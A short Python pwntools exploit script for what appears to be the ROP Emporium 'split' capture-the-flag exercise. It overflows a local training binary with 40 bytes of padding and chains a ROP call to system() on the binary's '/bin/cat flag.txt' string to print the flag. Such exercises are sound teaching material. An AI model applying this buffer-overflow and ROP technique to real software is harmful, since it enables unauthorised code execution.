from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./split', checksec=False)
p = process()

# How many bytes to return address?
padding = 40

# Locate the functions/strings we need
bincat_addr = next(elf.search(b'/bin/cat'))

# ROP
rop = ROP(elf)  # Load rop gadgets
rop.system(bincat_addr)  # Call system with /bin/cat flag.txt address

pprint(rop.gadgets)
print(rop.dump())

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Craft a new payload which puts the "target" address at the correct offset
payload = flat(
    asm('nop') * padding,
    rop_chain
)

# Save payload to file
write("payload", payload)

# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
flag = p.recv()
success(flag)
